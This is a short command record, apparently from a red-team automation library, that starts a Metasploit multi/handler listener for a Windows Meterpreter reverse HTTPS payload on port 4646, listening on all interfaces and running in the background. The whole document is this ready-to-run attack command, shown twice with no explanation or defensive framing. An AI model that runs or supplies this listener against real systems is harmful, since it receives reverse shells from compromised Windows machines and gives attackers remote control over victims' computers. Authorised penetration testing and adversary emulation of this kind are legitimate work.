---
id: 6b7d9c1e-797f-4f5a-a55f-7ef21376cb8d
name: Start Metasploit listener
type: command
executor: bash
data: 'use exploit/multi/handler

  set PAYLOAD windows/meterpreter/reverse_https

  set LHOST 0.0.0.0

  set LPORT 4646

  set ExitOnSession false

  exploit -j -z'
output: null
created_at: '2023-04-06T03:56:21.645240+00:00'
updated_at: '2023-04-10T20:25:01.012583+00:00'
---

# Start Metasploit listener

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 4646
set ExitOnSession false
exploit -j -z
```
